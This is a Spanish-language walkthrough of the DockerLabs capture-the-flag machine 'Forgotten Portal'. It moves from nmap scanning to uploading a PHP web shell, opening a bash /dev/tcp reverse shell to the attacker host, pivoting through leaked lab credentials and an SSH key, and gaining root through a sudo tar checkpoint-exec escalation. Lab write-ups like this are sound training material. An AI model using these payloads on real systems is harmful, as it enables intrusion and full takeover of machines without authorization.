# FORGOTTEN PORTAL - DOCKERLABS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [DockerLabs](https://dockerlabs.es)

Para descargarla vas a [DockerLabs](https://dockerlabs.es) y buscas la máquina Forgotten Portal. Abres el enlace de mega, descargas el zip, lo descomprimes y ejecutas `bash ./auto_deploy.sh ./forgotten_portal.tar`. De esta forma se ejecutará el contendor de docker de la máquina.

### descripción

- Dificultad: medio
- Sistema Operativo: linux
- Autor: Cyberland

## ESQUEMA

![forgottenportal](https://github.com/user-attachments/assets/c83f6e2f-fa04-4073-867f-e6071e480f0b)

## ENUMERACIÓN

### conectividad y SO

Primero comprobamos la conectividad con la máquina:

```python
ping -c 1 172.17.0.2
```

![image](https://github.com/user-attachments/assets/f38c0de7-c42e-4cd8-95a6-a951df387a85)

Nos llega respuesta. Como el TTL es de 64, la máquina seguramente use Linux.

### escaneo de puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/0183a442-b1ef-499b-ad1c-e452ea751977)

#### puertos abiertos

**22 - TCP - SSH**

**80 - TCP - HTTP**

Ahora hacemos un escaneo de servicios y versiones sobre el puerto 22 y 80:

```python
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

> `-p22,80` hacer el escaneo solo sobre los puertos 22 y 80

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/0e1be30e-6b9e-4118-9afb-2b695989a448)

### puerto 80

Hacemos `whatweb http://172.17.0.2` para ver que tecnologías usa la página web, pero hay nada interesante. Cargamos el servicio web en el naveagdor:

![image](https://github.com/user-attachments/assets/aa683123-b574-40bb-8d71-b94d32f9e13f)

No encontramos mucha información útil a simple vista, aunque en la parte de "Equipo", hay tres posibles usuarios. Si inspeccionamos el código de la página principal, vemos este comentario:

![image](https://github.com/user-attachments/assets/8190cfc2-ea06-4c70-a705-97c0a3517147)

Cargamos el archivo `m4ch1n3_upload.html`:

![image](https://github.com/user-attachments/assets/9e36c7b9-1009-451a-a3a2-716c4bbbfd8b)

Y vemos este panel de subida de archivos.

## EXPLOTACIÓN

Al parecer se pueden subir archivos PHP, así que probamos a subir esta web shell de primeras:

```python
<?php
    system($_GET['cmd']);
?>
```

Luego vamos a `/uploads`, y cargamos el archivo. Probamos a ejecutar el comando `id`:

![image](https://github.com/user-attachments/assets/8ba4a444-624a-4a42-a3eb-745309eb5de2)

Funciona. Ahora para ganar acceso a la máquina seguimos estos pasos:

Nos ponemos en escucha por el puerto que sea:

```python
nc -nlvp 443
```

Ejecutamos este comando desde la web shell:

```python
/bin/bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

![image](https://github.com/user-attachments/assets/023daa6e-2458-4627-8ce1-a47e793ff1f5)

Y nos llega la conexión.

## TRATAMIENTO TTY

```python
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows <filas> columns <columnas>
```

Para ver el número de filas y columnas que usa tu pantalla, ejecutas `stty -a`.

## ESCALADA DE PRIVILEGIOS

### alice

Somos el usuario www-data. No tenemos permisos de sudo, tampoco hay archivos SUID interesantes, ni nada por el estilo. Si vamos a `/var/www/html`, encontramos un archivo interesante llamado `access_log`:

![image](https://github.com/user-attachments/assets/a70c3912-1bc6-425e-8f5e-432b41077cb4)

En una parte de este archivo hay una cadena que parece estar codificada en base64. La intentamos decodificar:

```python
echo "YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3" | base64 -d; echo
```

![image](https://github.com/user-attachments/assets/8f72b26e-38f6-41a0-8c2f-658a6fa66042)

Parece que tiene la contraseña del usuario alice: `s3cr3tp@ssw0rd^487`. Ahora hacemos `su alice` y ponemos la contraseña.

### bob

Ahora somos el usuario alice. Tampoco tenemos permisos de sudo. Si vamos a `/home/alice`, hay un directorio llamado `incidents` que tiene un archivo `report`:

![image](https://github.com/user-attachments/assets/5f4606c4-58e3-4e66-89ff-339c2782317d)

En este se nos dice que todos los usuarios del sistema comparten la misma clave SSH, y que la passphrase es `cyb3r_s3curity`. Entonces vamos a `/home/alice/.ssh`, y usamos la `id_rsa` (hay que ejeceutar `chmod 600 id_rsa`, ya que tiene permisos incorrectos) para conectarnos como bob a la máquina víctima:

```python
ssh bob@172.17.0.2 -i id_rsa
```

Y de passphrase: `cyb3r_s3curity`.

### root

Ahora somos bob, y si ejecutamos `sudo -l`:

![image](https://github.com/user-attachments/assets/7b778056-3432-4fee-8e12-b2c4a3cd0faf)

Veremos que podemos ejecutar como cualquier usuario, sin usar nuestra contraseña, el binario `/bin/tar`. Buscamos en [gtfobins](https://gtfobins.github.io/) por el ejecutable `tar`:

![image](https://github.com/user-attachments/assets/1d6bd9b5-a9c7-421d-ab9e-af15b8f66b08)

Ejecutamos:

```python
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![image](https://github.com/user-attachments/assets/91a6d286-e8f6-4e8b-b991-89d0ed35b788)

Y ganamos una bash como root en la máquina Forgotten Portal.